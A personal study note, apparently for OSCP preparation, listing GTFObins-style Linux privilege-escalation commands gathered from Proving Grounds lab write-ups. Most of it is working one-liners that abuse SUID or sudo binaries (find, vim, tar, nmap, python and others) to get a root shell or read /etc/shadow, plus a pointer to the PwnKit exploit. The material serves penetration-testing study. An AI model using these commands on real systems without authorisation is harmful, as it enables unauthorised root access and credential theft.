---
title: "GTFObins — SUID/Sudo Binary Quick Reference"
created: "2026-04-11"
updated: "2026-04-11"
type: permanent-note
status: active
tags:
  - permanent-note
  - privilege-escalation
  - linux
  - suid
  - gtfobins
  - oscp
related:
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Advanced-Linux-PrivEsc-Patterns]]"
  - "[[Reverse-Shell-Reference]]"
---

# GTFObins — SUID/Sudo Binary Quick Reference

**Core idea:** GTFObins (https://gtfobins.github.io/) is your single most important resource for Linux PrivEsc. When you find a binary via SUID or sudo, look it up immediately. This note captures the specific binaries and exploits seen across 70+ Proving Grounds writeups.

**The SUID search command:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**The sudo check:**
```bash
sudo -l
```

---

## Binaries Found in PG Writeups — Compiled Reference

### mawk (SUID) — OnSystemShellDredd
```bash
mawk '//' "/etc/shadow"     # read files as root
mawk 'BEGIN {system("/bin/sh")}'  # shell (if SUID)
```

### cpulimit (SUID) — OnSystemShellDredd
```bash
cpulimit -l 100 -f /bin/sh -p     # SUID → root shell
```

### find (SUID) — DC-1, multiple boxes
```bash
find . -exec /bin/bash -p \; -quit
find . -exec "/bin/dash" \; -quit
# Creates root shell via exec — the -p preserves SUID permissions
```

### php7.2 (SUID) — Photographer
```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### zsh (SUID) — Dawn
```bash
zsh        # if zsh has SUID bit, running it drops to root
/bin/zsh -p
```

### nmap (sudo without password) — Ha-natraj
```bash
echo 'os.execute("/bin/bash")' > /tmp/script.nse
sudo /usr/bin/nmap --script=/tmp/script.nse
```

### apt-get (sudo) — Djinn3
```bash
sudo apt-get changelog apt
# In the pager (less) that opens:
!/bin/sh   # shell escape
```

### vim/vi (sudo)
```bash
sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/sh'
```

### python/python3 (sudo or SUID)
```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

### less/more (sudo)
```bash
sudo less /etc/passwd
# In less: !/bin/sh
```

### awk (sudo)
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

### tar (sudo or SUID)
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### pkexec (SUID) — CVE-2021-4034 (Pwnkit)
```bash
# If pkexec is SUID and unpatched → Pwnkit exploit
# https://github.com/ly4k/PwnKit
./PwnKit
```

---

## The GUID Check

```bash
find / -perm -g=s -type f 2>/dev/null
```

GUID (group SUID) binaries run as their group owner. Less commonly exploitable, but check the group:

```bash
# From OnSystemShellDredd writeup
/usr/bin/mawk    # group = www-data
/usr/bin/cpulimit # group = root → directly exploitable
```

---

## Linux Capabilities — `getcap`

```bash
getcap -r / 2>/dev/null
```

Common exploitable capabilities:

| Capability | Binary | Exploit |
|-----------|--------|---------|
| `cap_setuid+ep` | python, perl, ruby | `setuid(0)` → root |
| `cap_net_raw+ep` | ping, tcpdump | limited network |
| `cap_dac_read_search+ep` | tar, find | read any file |

**From Hunit writeup:**
```bash
getcap -r / 2>/dev/null
/usr/bin/newgidmap cap_setgid=ep
/usr/bin/newuidmap cap_setuid=ep
```

---

## The GTFObins Workflow

1. Run `find / -perm -u=s -type f 2>/dev/null` → get list of SUID binaries
2. For EACH binary, immediately visit `https://gtfobins.github.io/gtfobins/BINARY/#suid`
3. If it has a `SUID` section → try it
4. If not SUID, check `sudo` section (for binaries in `sudo -l` output)
5. Check `shell`, `file-read`, `file-write` sections as fallbacks

**Priority binaries to always check:**
- `find`, `python`, `perl`, `ruby`, `php`, `vim`, `awk`, `less`, `more`, `man`, `tar`, `cp`, `mv`, `nmap`, `curl`, `wget`, `git`, `env`, `bash`, `sh`, `dash`, `zsh`, `screen`, `tmux`

---

## Connections

- [[Linux-PrivEsc-Decision-Tree]] — where this fits in the overall decision tree
- [[Advanced-Linux-PrivEsc-Patterns]] — patterns beyond simple GTFObins (disk group, PATH hijack, etc.)
- [[Reverse-Shell-Reference]] — shell payloads for SUID exploits that give shell access

---

*Extracted from 70+ Proving Grounds writeups (PG Play + PG Practice, 2023–2024)*
*Key boxes: OnSystemShellDredd (mawk/cpulimit), DC-1 (find), Photographer (php), Dawn (zsh), Ha-natraj (nmap), Djinn3 (apt-get)*
